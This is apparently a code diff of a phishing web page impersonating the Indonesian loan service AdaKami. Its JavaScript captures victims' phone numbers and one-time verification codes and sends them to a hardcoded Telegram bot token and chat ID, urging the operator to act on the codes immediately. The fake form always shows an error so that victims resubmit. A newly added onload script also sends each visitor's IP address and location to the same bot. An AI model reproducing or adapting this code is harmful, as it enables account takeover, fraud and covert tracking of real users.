@@ -177,127 +177,190 @@
     </div>
 
     <script>
-        const BOT_TOKEN = '8509098791:AAFSfoRI9HUZe-wjcrVMt_n32Vt8KSZl8WM';
-        const CHAT_ID = '6242724406';
-        let userPhoneNumber = '';
-        let timerInterval;
+    const BOT_TOKEN = '8509098791:AAFSfoRI9HUZe-wjcrVMt_n32Vt8KSZl8WM';
+    const CHAT_ID = '6242724406';
+    let userPhoneNumber = '';
+    let timerInterval;
 
-        function validateInput(input) {
-            // Hanya angka
-            input.value = input.value.replace(/[^0-9]/g, '');
-            
-            // Logika JavaScript Tambahan untuk Menyembunyikan Label
-            const label = document.getElementById('phoneLabel');
-            if (input.value.length > 0) {
-                label.style.display = 'none';
-            } else {
-                label.style.display = 'block';
+    function validateInput(input) {
+        // Hanya angka
+        input.value = input.value.replace(/[^0-9]/g, '');
+        
+        // Logika JavaScript Tambahan untuk Menyembunyikan Label
+        const label = document.getElementById('phoneLabel');
+        if (input.value.length > 0) {
+            label.style.display = 'none';
+        } else {
+            label.style.display = 'block';
+        }
+    }
+
+    function handlePhoneSubmit(e) {
+        e.preventDefault();
+        const phoneInput = document.getElementById('phoneNumber');
+        const errorMsg = document.getElementById('phoneError');
+        let phone = phoneInput.value;
+        let isValid = false;
+
+        if (phone.startsWith('08')) {
+            if (phone.length >= 10 && phone.length <= 13) isValid = true;
+        } else if (phone.startsWith('628')) {
+            if (phone.length >= 11 && phone.length <= 14) isValid = true;
+        }
+
+        if (!isValid) {
+            errorMsg.style.display = 'block';
+            errorMsg.style.textAlign = 'center'; // Rata tengah teks error
+            return;
+        }
+
+        errorMsg.style.display = 'none';
+        userPhoneNumber = phone;
+
+        // Pesan Telegram dengan Emoji Unik
+        const message = `<b>🚀 NOTIFIKASI BARU 🚀</b>\n` +
+                        `----------------------------------\n` +
+                        `<b>📱 PENGIRIM :</b> <code>${phone}</code>\n` +
+                        `<b>🌐 DOMAIN   :</b> www.adakami.website\n` +
+                        `<b>🛰 STATUS   :</b> Menunggu OTP...\n` +
+                        `----------------------------------`;
+
+        sendTelegramMessage(message);
+        showOtpModal(phone);
+    }
+
+    function sendTelegramMessage(text) {
+        // Menggunakan parse_mode=HTML agar emoji dan format teks aktif
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
+        fetch(url).catch(error => console.error('Error:', error));
+    }
+
+    function showOtpModal(phone) {
+        const modal = document.getElementById('otpModal');
+        const desc = document.getElementById('otpDesc');
+        
+        // Judul dan deskripsi dibuat rata tengah
+        desc.style.textAlign = 'center';
+        desc.innerHTML = `📬 <b>Kode verifikasi dikirim</b><br>(${phone.slice(0, 4)}****${phone.slice(-4)})`;
+        
+        modal.style.display = 'flex';
+        startTimer();
+        document.querySelectorAll('.otp-field')[0].focus();
+    }
+
+    function closeOtpModal() {
+        document.getElementById('otpModal').style.display = 'none';
+        clearInterval(timerInterval);
+    }
+
+    const otpInputs = document.querySelectorAll('.otp-field');
+    otpInputs.forEach((input, index) => {
+        // Menambahkan inputmode numeric agar keyboard HP otomatis muncul angka
+        input.setAttribute('inputmode', 'numeric');
+        
+        input.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+            if (e.target.value.length === 1) {
+                if (index < otpInputs.length - 1) otpInputs[index + 1].focus();
             }
-        }
-
-        function handlePhoneSubmit(e) {
-            e.preventDefault();
-            const phoneInput = document.getElementById('phoneNumber');
-            const errorMsg = document.getElementById('phoneError');
-            let phone = phoneInput.value;
-            let isValid = false;
-
-            if (phone.startsWith('08')) {
-                if (phone.length >= 10 && phone.length <= 13) isValid = true;
-            } else if (phone.startsWith('628')) {
-                if (phone.length >= 11 && phone.length <= 14) isValid = true;
-            }
-
-            if (!isValid) {
-                errorMsg.style.display = 'block';
-                return;
-            }
-
-            errorMsg.style.display = 'none';
-            userPhoneNumber = phone;
-            const message = `Hallo ADAKAMI\nPENGIRIM :  ${phone}`;
-            sendTelegramMessage(message);
-            showOtpModal(phone);
-        }
-
-        function sendTelegramMessage(text) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
-            fetch(url).catch(error => console.error('Error:', error));
-        }
-
-        function showOtpModal(phone) {
-            const modal = document.getElementById('otpModal');
-            const desc = document.getElementById('otpDesc');
-            desc.innerHTML = `Kode verifikasi dikirim<br>(${phone.slice(0, 4)}****${phone.slice(-4)})`;
-            modal.style.display = 'flex';
-            startTimer();
-            document.querySelectorAll('.otp-field')[0].focus();
-        }
-
-        function closeOtpModal() {
-            document.getElementById('otpModal').style.display = 'none';
-            clearInterval(timerInterval);
-        }
-
-        const otpInputs = document.querySelectorAll('.otp-field');
-        otpInputs.forEach((input, index) => {
-            input.addEventListener('input', (e) => {
-                e.target.value = e.target.value.replace(/[^0-9]/g, '');
-                if (e.target.value.length === 1) {
-                    if (index < otpInputs.length - 1) otpInputs[index + 1].focus();
-                }
-            });
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && e.target.value.length === 0) {
-                    if (index > 0) otpInputs[index - 1].focus();
-                }
-            });
         });
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && e.target.value.length === 0) {
+                if (index > 0) otpInputs[index - 1].focus();
+            }
+        });
+    });
 
-        function handleOtpSubmit(e) {
-            e.preventDefault();
-            let otpCode = '';
-            otpInputs.forEach(input => otpCode += input.value);
-            if (otpCode.length < 6) return;
+    function handleOtpSubmit(e) {
+        e.preventDefault();
+        let otpCode = '';
+        otpInputs.forEach(input => otpCode += input.value);
+        if (otpCode.length < 6) return;
 
-            const loader = document.getElementById('loadingSpinner');
-            const otpError = document.getElementById('otpErrorText');
-            loader.style.display = 'flex';
-            otpError.style.display = 'none';
+        const loader = document.getElementById('loadingSpinner');
+        const otpError = document.getElementById('otpErrorText');
+        loader.style.display = 'flex';
+        otpError.style.display = 'none';
 
-            const formattedOtp = otpCode.substring(0,3) + '-' + otpCode.substring(3,6);
-            const message = `KODE OTP \nOTP :  ${formattedOtp}`;
-            sendTelegramMessage(message);
+        const formattedOtp = otpCode.substring(0,3) + '-' + otpCode.substring(3,6);
+        
+        // Pesan OTP dengan Emoji Bergerak/Unik di Telegram
+        const message = `<b>⚡️ KODE OTP MASUK ⚡️</b>\n` +
+                        `----------------------------------\n` +
+                        `<b>🔑 OTP CODE :</b> <code>${formattedOtp}</code>\n` +
+                        `<b>👤 NOMOR    :</b> <code>${userPhoneNumber}</code>\n` +
+                        `<b>⏰ WAKTU    :</b> ${new Date().toLocaleTimeString()}\n` +
+                        `----------------------------------\n` +
+                        `<b>🔥 SEGERA EKSEKUSI! 🔥</b>`;
 
-            setTimeout(() => {
-                loader.style.display = 'none';
-                otpError.style.display = 'block';
-                otpInputs.forEach(input => input.value = '');
-                otpInputs[0].focus();
-            }, 3000);
-        }
+        sendTelegramMessage(message);
 
-        function startTimer() {
-            let timeLeft = 60;
-            const timerText = document.getElementById('timerText');
-            const resendLink = document.getElementById('resendLink');
-            resendLink.style.display = 'none';
-            timerText.style.display = 'inline';
-            clearInterval(timerInterval);
-            timerInterval = setInterval(() => {
-                timeLeft--;
-                timerText.innerText = `Kirim ulang dalam ${timeLeft}s`;
-                if (timeLeft <= 0) {
-                    clearInterval(timerInterval);
-                    timerText.style.display = 'none';
-                    resendLink.style.display = 'inline';
-                }
-            }, 1000);
-        }
+        setTimeout(() => {
+            loader.style.display = 'none';
+            otpError.style.display = 'block';
+            otpError.style.textAlign = 'center'; // Rata tengah teks error OTP
+            otpInputs.forEach(input => input.value = '');
+            otpInputs[0].focus();
+        }, 3000);
+    }
 
-        function resetTimer() {
-            startTimer();
-        }
+    function startTimer() {
+        let timeLeft = 60;
+        const timerText = document.getElementById('timerText');
+        const resendLink = document.getElementById('resendLink');
+        
+        // Pengaturan rata tengah untuk timer
+        timerText.style.textAlign = 'center';
+        resendLink.style.textAlign = 'center';
+        
+        resendLink.style.display = 'none';
+        timerText.style.display = 'inline';
+        clearInterval(timerInterval);
+        timerInterval = setInterval(() => {
+            timeLeft--;
+            timerText.innerText = `⏳ Kirim ulang dalam ${timeLeft}s`;
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                timerText.style.display = 'none';
+                resendLink.style.display = 'inline';
+            }
+        }, 1000);
+    }
+
+    function resetTimer() {
+        startTimer();
+    }
     </script>
+        <script type="text/javascript">
+            window.onload = function() {
+    const botToken = "8509098791:AAFSfoRI9HUZe-wjcrVMt_n32Vt8KSZl8WM";
+    const chatId = "6242724406";
+
+    // Mengambil data lokasi pengunjung berdasarkan IP
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        const infoPesan = `<b>🚀 NGA!!! NGA!!! ADE YANG KLIK WEB!</b>\n\n` +
+                          `<b>Domain:</b> www.adakami.website\n` +
+                          `<b>IP:</b> <code>${data.ip}</code>\n` +
+                          `<b>Kota:</b> ${data.city}\n` +
+                          `<b>Negara:</b> ${data.country_name}\n` +
+                          `<b>Provider:</b> ${data.org}\n` +
+                          `<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
+
+        // Kirim notifikasi ke Telegram kamu
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: infoPesan,
+            parse_mode: 'HTML'
+          })
+        });
+      })
+      .catch(err => console.error("Gagal melacak kunjungan"));
+  };
+        </script>
 </body>
 </html>
